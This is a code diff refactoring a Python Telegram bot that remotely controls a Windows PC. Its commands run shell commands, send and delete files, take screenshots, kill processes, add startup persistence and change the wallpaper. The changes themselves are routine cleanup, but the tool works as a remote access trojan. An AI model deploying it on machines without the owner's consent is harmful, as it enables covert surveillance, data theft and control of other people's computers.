@@ -6,7 +6,7 @@ from random import uniform
 import data.data_api as api
 import data.data_win as win
 from subprocess import call
-import token as telegram_api
+import api_token as telegram_api
 from win32api import GetTempPath
 from telebot import TeleBot, types
 import data.data_speech as speech
@@ -25,13 +25,14 @@ class RemoteDesktop(object):
         3. Creating <Bot> object
         4. Sending Log << wm_online_status
         """
-        self.TelegramToken = telegram_api.TelegramToken
+        self.ConnectionErrors = (ConnectionRefusedError, ConnectionError, ConnectionAbortedError, ConnectionResetError)
+        self.TelegramToken = telegram_api.token
         self.bot = TeleBot(self.TelegramToken)
-        self.keyboard = self.KeyboardCreating()
+        self.keyboard = self.create_keyboard()
         self.bot.send_message(users.MainUserId, api.Api().GetLog(), reply_markup=self.keyboard)
 
     @staticmethod
-    def KeyboardCreating():
+    def create_keyboard():
         keyboard = types.ReplyKeyboardMarkup(True)
         for command in commands.KeyboardC:
             keyboard.row(f'/{command}')
@@ -39,7 +40,7 @@ class RemoteDesktop(object):
         return keyboard
 
     @staticmethod
-    def ArrayParser(array, ind):
+    def array_parser(array, ind):
         """
         Clearing [0] element [ind] times
         :param array:   >> List
@@ -50,6 +51,10 @@ class RemoteDesktop(object):
             array.pop(0)
 
         return array
+
+    @staticmethod
+    def random_name():
+        return f'{floor(uniform(0, 563739759))}'
 
     def Run(self):
         """
@@ -83,7 +88,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionAbortedError and ConnectionResetError and ConnectionError and ConnectionRefusedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['DelUser'])
@@ -101,7 +106,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['GetUsers'])
@@ -118,11 +123,12 @@ class RemoteDesktop(object):
                         user_id = user[0]
                         user_name = user[1]
                         output.append(f'Name: "{user_name}"; Id: {user_id}')
+
                     self.bot.send_message(message.from_user.id, "\n".join(output))
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['Hotkey'])
@@ -137,13 +143,13 @@ class RemoteDesktop(object):
                 try:
                     args = message.text.split(" ")
                     args.pop(0)
-                    hotkey = " ".join(args)
-                    self.keyboard.row(hotkey)
-                    self.bot.send_message(message.from_user.id, f'"{hotkey}" was added.', reply_markup=self.keyboard)
+                    hotkey_command = " ".join(args)
+                    self.keyboard.row(hotkey_command)
+                    self.bot.send_message(message.from_user.id, f'"{hotkey_command}" was added.', reply_markup=self.keyboard)
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['GetLog'])
@@ -160,7 +166,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionAbortedError and ConnectionRefusedError and ConnectionError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=[commands.MainC['Stop']])
@@ -177,7 +183,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=[commands.MainC['Cmd']])
@@ -198,7 +204,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["CallSysFunc"])
@@ -217,7 +223,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["DownloadFile"])
@@ -242,7 +248,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["DelFile"])
@@ -264,7 +270,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["Say"])
@@ -284,12 +290,12 @@ class RemoteDesktop(object):
                     rate = int(args[0])
                     voice_index = int(args[1])
                     volume = float(args[2])
-                    text = " ".join(self.ArrayParser(args, 3))
+                    text = " ".join(self.array_parser(args, 3))
                     speech.Speech(rate, voice_index, volume, text).Synthesize()
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["GetActWinT"])
@@ -305,7 +311,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["GetAllWinT"])
@@ -321,7 +327,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["Screenshot"])
@@ -340,7 +346,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["GetCPName"])
@@ -356,7 +362,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["GetUserName"])
@@ -372,7 +378,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC["CallHardSysE"])
@@ -388,7 +394,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands.MainC['monitor'])
@@ -406,7 +412,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands.MainC['GetPRCS'])
@@ -422,7 +428,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands.MainC['FindPRCS'])
@@ -440,7 +446,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands.MainC['KillPRCS'])
@@ -457,7 +463,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['MsgBox'])
@@ -477,12 +483,12 @@ class RemoteDesktop(object):
                     args.pop(0)
                     msg_count = int(args[0])
                     title = args[1]
-                    text = " ".join(self.ArrayParser(args, 2))
+                    text = " ".join(self.array_parser(args, 2))
                     c_windll.messagebox(title, text, msg_count)
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=['Functions', 'f', 'cmm'])
@@ -498,7 +504,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['startup'])
@@ -518,7 +524,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['GetANM'])
@@ -534,7 +540,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['ResetK'])
@@ -547,19 +553,19 @@ class RemoteDesktop(object):
             """
             if message.from_user.id in users.Users.keys():
                 try:
-                    self.keyboard = self.KeyboardCreating()
+                    self.keyboard = self.create_keyboard()
                     self.bot.send_message(message.from_user.id, "Keyboard buttons was reseted", reply_markup=self.keyboard)
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['cdrom'])
         def cdrom(message):
             """
             Cdrom conrol
-            args: open / close
+            args: [open/close]
             :param message:
             :return:
             """
@@ -572,7 +578,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(commands=commands.MainC['mkdir'])
@@ -592,7 +598,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionError and ConnectionAbortedError and ConnectionRefusedError and ConnectionResetError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(content_types=['document'])
@@ -608,8 +614,8 @@ class RemoteDesktop(object):
                     file_name = message.document.file_name                      # filename
                     file_info = self.bot.get_file(message.document.file_id)     # getting file
                     file_data = self.bot.download_file(file_info.file_path)     # getting file data
-
-                    with open(f'{file_path}\\{file_name}', 'wb') as file:
+                    full_path = f'{file_path}\\{file_name}'
+                    with open(full_path, 'wb') as file:
                         file.write(file_data)       # saving file
                         file.close()
 
@@ -617,7 +623,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(content_types=['audio'])
@@ -631,7 +637,7 @@ class RemoteDesktop(object):
             if message.from_user.id in users.Users.keys():
                 try:
                     file_path = GetTempPath()                                 # file path
-                    file_name = f'{floor(uniform(0, 4938243280))}.mp3'                      # filename
+                    file_name = f'{self.random_name()}.mp3'                      # filename
                     file_info = self.bot.get_file(message.audio.file_id)     # getting file
                     file_data = self.bot.download_file(file_info.file_path)     # getting file data
                     full_path = f'{file_path}\\{file_name}'
@@ -644,7 +650,7 @@ class RemoteDesktop(object):
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         @self.bot.message_handler(content_types=['photo'])
@@ -659,18 +665,18 @@ class RemoteDesktop(object):
                 try:
                     file_info = self.bot.get_file(message.photo[len(message.photo) - 1].file_id)
                     downloaded_file = self.bot.download_file(file_info.file_path)
-                    src = GetTempPath() + f'{floor(uniform(0, 4938243280))}'
+                    src = GetTempPath() + self.random_name()
 
                     with open(src, 'wb') as new_file:
                         new_file.write(downloaded_file)
                         new_file.close()
 
                     c_windll.set_wallpapers(src)
-                    self.bot.reply_to(message, f'"{src}" file was setted as wallpapers.')
+                    self.bot.reply_to(message, f'"{src}" file was used as wallpapers.')
                 except Exception as e:
                     try:
                         self.bot.send_message(message.from_user.id, e)
-                    except ConnectionRefusedError and ConnectionError and ConnectionResetError and ConnectionAbortedError:
+                    except self.ConnectionErrors:
                         pass
 
         self.bot.polling(none_stop=True)
